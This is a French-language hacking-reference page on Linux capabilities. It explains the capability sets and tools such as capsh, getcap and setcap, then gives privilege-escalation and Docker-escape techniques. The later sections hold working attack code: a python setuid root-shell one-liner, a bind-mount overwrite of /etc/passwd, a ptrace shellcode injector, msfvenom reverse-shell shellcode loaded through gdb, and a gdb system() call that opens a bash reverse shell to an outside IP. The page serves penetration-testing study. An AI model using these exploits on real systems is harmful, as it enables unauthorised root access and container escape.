# Capacités Linux

{{#include ../../banners/hacktricks-training.md}}

Les capabilities Linux divisent les **privilèges root en unités plus petites et distinctes**, permettant aux processus de disposer d’un sous-ensemble de privilèges. Cela réduit les risques en évitant d’accorder inutilement tous les privilèges root.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Le problème :

- Les utilisateurs normaux disposent de permissions limitées pour des opérations telles que l’ouverture de raw sockets ou l’association à des ports Internet inférieurs à 1024 ; les capabilities peuvent accorder uniquement l’opération requise, au lieu de l’ensemble des privilèges root.<sup>[[14]](#references)</sup>

### Ensembles de capabilities :

Linux expose ces ensembles de capabilities par thread, et le kernel applique leurs contraintes lorsqu’un processus change d’identifiants ou exécute un fichier.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)** :

   - **Objectif** : Identifie les capabilities susceptibles de contribuer à l’ensemble permis après `execve()` lorsque le fichier exécuté possède des file capabilities inheritable correspondantes.
   - **Fonctionnement** : L’ensemble inheritable du thread est conservé après `execve()` ; à lui seul, il ne rend pas ces capabilities effectives.
   - **Restrictions** : L’ajout d’une capability à cet ensemble est limité par les ensembles permitted et bounding.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)** :

   - **Objectif** : Représente les capabilities réellement utilisées par un processus à un instant donné.
   - **Fonctionnement** : C’est l’ensemble de capabilities que le kernel vérifie pour autoriser diverses opérations. Pour les fichiers, cet ensemble peut être un indicateur précisant si les capabilities permitted du fichier doivent être considérées comme effectives.
   - **Importance** : L’ensemble effective est essentiel pour les vérifications immédiates des privilèges ; il constitue l’ensemble actif des capabilities qu’un processus peut utiliser.

3. **Permitted (CapPrm)** :

   - **Objectif** : Définit l’ensemble maximal de capabilities qu’un processus peut posséder.
   - **Fonctionnement** : Un processus peut faire passer une capability de l’ensemble permitted à son ensemble effective, ce qui lui permet d’utiliser cette capability. Il peut également supprimer des capabilities de son ensemble permitted.
   - **Limite** : Si une capability est supprimée de cet ensemble, elle ne peut normalement pas être restaurée sans exécuter un fichier qui la lui accorde ou effectuer une autre transition privilégiée.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)** :

   - **Objectif** : Limite les capabilities qu’un processus peut obtenir d’un fichier lors de `execve()` et celles qu’il peut ajouter à son ensemble inheritable.
   - **Fonctionnement** : L’ensemble est hérité lors de `fork()` et conservé lors de `execve()` ; des capabilities peuvent en être supprimées si l’appelant dispose de `CAP_SETPCAP`.
   - **Cas d’utilisation** : La suppression des capabilities inutiles de cet ensemble limite l’acquisition ultérieure de privilèges.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)** :
   - **Objectif** : Permet à certaines capabilities de rester permitted et effective lors de l’exécution d’un programme non privilégié avec `execve()`.
   - **Fonctionnement** : Les capabilities ambient sont ajoutées aux nouveaux ensembles permitted et effective lorsque le fichier exécuté n’est pas privilégié.
   - **Restrictions** : Une capability ne peut être ambient que si elle est présente dans les deux ensembles permitted et inheritable ; l’exécution d’un fichier set-user-ID/set-group-ID ou d’un fichier doté de capabilities efface l’ensemble ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities des processus et des binaires

### Capabilities des processus

Pour consulter les capabilities d’un processus particulier, utilisez le fichier **status** du répertoire /proc. Comme il fournit davantage de détails, limitons-nous aux informations relatives aux capabilities Linux.\
Notez que, pour tous les processus en cours d’exécution, les informations sur les capabilities sont conservées par thread, tandis que les file capabilities sont stockées dans des attributs étendus `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Vous trouverez les capabilities définies dans /usr/include/linux/capability.h

Vous pouvez consulter les capabilities du processus actuel avec `cat /proc/self/status` ou `capsh --print`, et celles d’autres processus dans `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Cette commande devrait renvoyer cinq lignes de capacités sur la plupart des systèmes.<sup>[[15]](#references)</sup>

- CapInh = Capacités héritées
- CapPrm = Capacités autorisées
- CapEff = Capacités effectives
- CapBnd = Ensemble de limitation
- CapAmb = Ensemble de capacités ambiantes

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Ces nombres hexadécimaux n’ont aucun sens. À l’aide de l’utilitaire `capsh`, nous pouvons les décoder en noms de capabilities.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Vérifions maintenant les **capacités** utilisées par `ping` :

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Bien que cela fonctionne, il existe une autre méthode plus simple. Pour voir les capabilities d’un processus en cours d’exécution, utilisez l’outil **getpcaps** suivi de son identifiant de processus (PID) ; il accepte également une liste d’identifiants de processus.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Vérifions les capacités de `tcpdump` après avoir attribué au binaire `cap_net_admin` et `cap_net_raw` pour capturer le trafic réseau (`tcpdump` s’exécute dans le processus 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Comme vous pouvez le constater, les capacités correspondent aux résultats obtenus avec les deux méthodes d’inspection d’un processus. L’outil `getpcaps` utilise libcap pour interroger les capacités d’un processus cible et les afficher sous forme de texte ; il accepte un ou plusieurs PID.<sup>[[22]](#references)</sup>

### Capacités des binaires

Les binaires peuvent avoir des capacités de fichier appliquées lors de leur exécution. Par exemple, un binaire `ping` peut disposer de la capacité `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Vous pouvez **rechercher des binaires avec des capabilities** à l’aide de `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Abandonner des capabilities avec capsh

Si nous retirons `CAP_NET_RAW` de l’ensemble de limitation en vigueur, un programme qui a besoin de cette capability ne devrait plus pouvoir l’utiliser.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Outre la sortie de _capsh_ lui-même, la commande _tcpdump_ devrait également renvoyer une erreur.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L’erreur indique que `tcpdump` ne peut pas s’exécuter avec la capacité de fichier demandée après le retrait de `CAP_NET_RAW` de l’ensemble des capacités autorisées.

### Supprimer des capacités

Vous pouvez supprimer les capacités d’un fichier avec `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Capacités utilisateur

Linux n’associe pas directement de capacités de fichier à un utilisateur connecté, mais le module PAM `pam_cap` peut définir des capacités héritables pour les sessions authentifiées à l’aide de `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Chaque entrée associe des noms ou des numéros de capacités séparés par des virgules à un ou plusieurs noms d’utilisateur.<sup>[[17]](#references)</sup>
Exemple de fichier :

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capacités de l’environnement

Compiler le programme suivant permet de **lancer un shell bash dans un environnement qui fournit des capacités**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

À l’intérieur de **bash exécuté par le binaire ambient compilé**, il est possible d’observer les **nouvelles capacités** (un utilisateur ordinaire n’aura aucune capacité dans la section « current »).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Vous pouvez **uniquement ajouter des capacités présentes** à la fois dans les ensembles autorisé et héritable.<sup>[[14]](#references)</sup>

### Binaires compatibles avec les capabilities / non compatibles avec les capabilities

Un binaire non compatible avec les capabilities est un programme doté de capacités de fichier qui n’utilise pas libcap pour les gérer. Si son bit effectif de fichier est activé, le kernel active les capacités autorisées du fichier dans l’ensemble effectif du processus ; l’exécution peut échouer si le processus n’a pas obtenu toutes les capacités autorisées.<sup>[[14]](#references)</sup>

## Capacités des services

Un service système exécuté en tant que root peut conserver de vastes capacités, sauf si son environnement d’exécution les restreint. Dans une unité systemd, `User=` définit l’utilisateur du service et `AmbientCapabilities=` ajoute les capacités nommées à l’ensemble ambient du processus exécuté.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capacités dans les conteneurs Docker

Docker démarre les conteneurs avec un ensemble de capacités par défaut, qui peut être modifié avec `--cap-add` et `--cap-drop` ; un conteneur d’exemple peut être inspecté avec `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Les capabilities sont utiles lorsque vous **souhaitez restreindre vos propres processus après avoir effectué des opérations privilégiées** (par exemple, après avoir configuré chroot et lié un socket). Cependant, elles peuvent être exploitées en leur passant des commandes ou des arguments malveillants qui sont ensuite exécutés en tant que root.<sup>[[2]](#references)</sup>

Vous pouvez définir de force des file capabilities sur des programmes avec `setcap`, et les interroger avec `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Dans la syntaxe des file capabilities, `+ep` ajoute la capability nommée aux ensembles effectif et autorisé ; `-` désactive les flags sélectionnés.<sup>[[21]](#references)</sup>

Pour repérer les programmes dotés de capabilities dans un système ou un dossier, utilisez `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Exemple d’exploitation

Dans l’exemple suivant, le binaire `/usr/bin/python2.6` est vulnérable à une élévation de privilèges :

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capacités** nécessaires à `tcpdump` pour **permettre à tout utilisateur de sniffer des paquets** :

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Cas particulier d’un nom de capability omis

Dans le format texte de libcap, si `getcap myelf` affiche `myelf =ep`, cela signifie que **toutes les capabilities** sont marquées comme effectives et autorisées, sous réserve du bounding set du processus exécuté, de son user namespace et d’autres restrictions d’exécution. L’ensemble vide de file capabilities s’écrit `myelf =` (sans `e` ni `p`) ; il est distinct d’un fichier sans attribut de capability. Un fichier `=ep` ne fait pas à lui seul passer l’UID du processus à root, mais un programme capable d’utiliser `CAP_DAC_READ_SEARCH` ou `CAP_DAC_OVERRIDE` peut lire des fichiers auxquels son UID Unix ne lui donnerait autrement pas accès. Vérifiez le mode du fichier exécutable réel, son namespace et ses capabilities effectives avant de considérer ses options d’entrée comme un moyen privilégié de lire des fichiers. Voir le [format texte des capabilities](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) et le [comportement des valeurs vides](https://man7.org/linux/man-pages/man8/getcap.8.html) de libcap.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** est une capability Linux très puissante, souvent assimilée à un niveau proche de root en raison de ses nombreux **privilèges administratifs**, tels que le montage de périphériques ou la manipulation de fonctionnalités du kernel. Bien qu’indispensable aux containers qui simulent des systèmes entiers, **`CAP_SYS_ADMIN` pose d’importants problèmes de sécurité**, en particulier dans les environnements conteneurisés, en raison de son potentiel d’escalade de privilèges et de compromission du système. Son utilisation exige donc des évaluations de sécurité rigoureuses et une gestion prudente. Il est fortement recommandé de supprimer cette capability dans les containers dédiés à une application, afin de respecter le **principe du moindre privilège** et de réduire la surface d’attaque.<sup>[[14]](#references)</sup>

Pour les changements de namespace, le contexte est important : `setns()` vérifie `CAP_SYS_ADMIN` par rapport au user namespace propriétaire de la cible. Entrer dans un mount namespace exige également `CAP_SYS_CHROOT` dans le user namespace de l’appelant. Une capability détenue uniquement dans un user namespace privé remappé ne permet donc pas d’entrer arbitrairement dans les namespaces initiaux de l’hôte.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

À l’aide de Python, vous pouvez monter un fichier _passwd_ modifié par-dessus le véritable fichier _passwd_ :

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Et enfin, **montez** le fichier `passwd` modifié sur `/etc/passwd` :

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Et vous pourrez **`su` en tant que root** avec le mot de passe « password ».

**Exemple avec l’environnement (Docker breakout)**

Vous pouvez vérifier les capabilities activées dans le conteneur Docker à l’aide de :

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dans la sortie précédente, vous pouvez voir que la capability SYS_ADMIN est activée.<sup>[[14]](#references)</sup>

- **Mount**

Avec un accès approprié aux périphériques et aux espaces de noms, cela peut permettre à un conteneur Docker de **monter un disque hôte et d’accéder à son contenu**. Le nœud de périphérique doit représenter un véritable périphérique hôte, le cgroup des périphériques doit l’autoriser, et le montage d’un système de fichiers basé sur des blocs nécessite `CAP_SYS_ADMIN` dans l’espace de noms utilisateur initial.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Accès complet**

Dans la méthode précédente, nous avons réussi à accéder à un disque de l’hôte.\
Si l’hôte exécute un serveur **ssh**, vous pouvez **créer un utilisateur sur le disque monté** et y accéder via SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Les lectures et écritures directes sous `/mnt/host` donnent déjà accès au système de fichiers de l’hôte. Le `chroot` final est uniquement une commodité de chemin d’accès et nécessite en plus `CAP_SYS_CHROOT` ; ce n’est pas l’étape qui permet l’évasion.

## CAP_SYS_PTRACE

Avec `CAP_SYS_PTRACE`, un processus peut tracer et inspecter les autres processus visibles dans son espace de noms PID. Pour cibler les processus de l’hôte depuis un conteneur Docker, partagez l’espace de noms PID de l’hôte avec `--pid=host` (ou rejoignez un espace de noms contenant le processus cible).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** accorde la possibilité d’utiliser les fonctionnalités de débogage et de traçage des appels système fournies par `ptrace(2)` et les appels d’attachement intermémoire comme `process_vm_readv(2)` et `process_vm_writev(2)`. Bien que cette capacité soit puissante pour le diagnostic et la surveillance, si `CAP_SYS_PTRACE` est activée sans mesures restrictives, comme un filtre seccomp sur `ptrace(2)`, elle peut considérablement compromettre la sécurité du système. En particulier, elle peut être exploitée pour contourner d’autres restrictions de sécurité, notamment celles imposées par seccomp, comme le montrent des [preuves de concept (PoC) comme celle-ci](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Exemple avec un binaire (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Exemple avec un binaire (gdb)**

`gdb` avec la capacité `ptrace` :

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Une capability sur un debugger n'est qu'une piste à examiner. Vérifiez si le processus actuel peut exécuter ce fichier précis (y compris avec les permissions de groupe et les ACL), si `CAP_SYS_PTRACE` est effective après l'exécution, et si une cible aux privilèges supérieurs est visible et peut être attachée dans le même espace de noms PID. `no_new_privs`, un montage `nosuid`, l'ensemble des limites des capabilities, Yama, seccomp ou un LSM peuvent modifier le résultat. Voir [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) et la [documentation Yama du noyau](https://docs.kernel.org/admin-guide/LSM/Yama.html). Énumérez les métadonnées des fichiers et des processus sans vous attacher à une cible.

Créer un shellcode avec msfvenom pour l'injecter en mémoire via gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Déboguez un processus root avec gdb et copiez-collez les lignes gdb générées précédemment :

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Exemple avec un environnement (évasion de Docker) - Autre abus de gdb**

Si **GDB** est installé (ou que vous pouvez l’installer avec `apk add gdb` ou `apt install gdb`, par exemple), vous pouvez **déboguer un processus visible de l’hôte** et lui faire appeler la fonction `system`. Cela nécessite le `CAP_SYS_PTRACE` effectif dans l’espace de noms utilisateur de la cible ainsi que la visibilité des PID de l’hôte ; `CAP_SYS_ADMIN` n’est pas nécessaire. Yama, l’état non-dumpable, seccomp et la politique LSM peuvent toutefois empêcher l’attachement.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Vous ne pourrez pas voir la sortie de la commande exécutée, mais elle sera exécutée par ce processus (obtenez donc un rev shell).

> [!WARNING]
> Si vous obtenez l’erreur "No symbol "system" in current context.", consultez l’exemple précédent sur le chargement d’un shellcode dans un programme via gdb.

**Exemple avec l’environnement (Docker breakout) - Shellcode Injection**

Vous pouvez vérifier les capabilities activées dans le conteneur Docker à l’aide de :

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Lister les **processus** exécutés sur l’**hôte** `ps -eaf`

1. Obtenir l’**architecture** `uname -m`
